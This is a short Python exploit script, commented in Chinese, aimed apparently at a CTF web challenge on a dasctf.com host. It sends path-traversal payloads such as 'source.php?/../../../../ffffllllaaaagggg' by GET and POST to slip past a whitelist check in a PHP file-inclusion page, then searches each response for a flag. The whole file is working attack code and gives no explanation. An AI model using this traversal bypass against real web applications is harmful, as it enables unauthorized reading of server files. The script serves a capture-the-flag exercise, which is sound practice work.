# -*- coding: utf-8 -*-
"""在 /source.php 入口测试标准 payload"""
import requests, re

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

payloads = [
    'source.php?/../../../../ffffllllaaaagggg',
    'hint.php?/../../../../ffffllllaaaagggg',
    'source.php?/../../../../../../../../ffffllllaaaagggg',
    'hint.php?/../../../../../../../../ffffllllaaaagggg',
]

for p in payloads:
    print(f'=== GET /source.php?file={p} ===')
    try:
        r = requests.get(base + '/source.php', params={'file': p}, timeout=12)
        L = len(r.text)
        flags = re.findall(r'flag\{[^}]+\}', r.text)
        if flags:
            print(f'  🏁 FLAG: {flags[0]}')
        elif 'you can\'t see it' in r.text:
            print(f'  ❌ checkFile 失败 (len={L})')
        elif L > 500 or ('ffffllllaaaagggg' in r.text and 'highlight' not in r.text.lower()):
            print(f'  ⚠️ 长响应(len={L}): {r.text[:200].replace(chr(10), " ")}')
        else:
            print(f'  ? (len={L}): {r.text[:150].replace(chr(10), " ")}')
    except Exception as e:
        print(f'  异常: {str(e)[:60]}')
    print()

print('=== POST /source.php ===')
r = requests.post(base + '/source.php', data={'file': 'source.php?/../../../../ffffllllaaaagggg'}, timeout=12)
flags = re.findall(r'flag\{[^}]+\}', r.text)
print(f'  len={len(r.text)}')
if flags:
    print(f'  🏁 FLAG: {flags[0]}')
else:
    print(f'  {r.text[:200].replace(chr(10), " ")}')
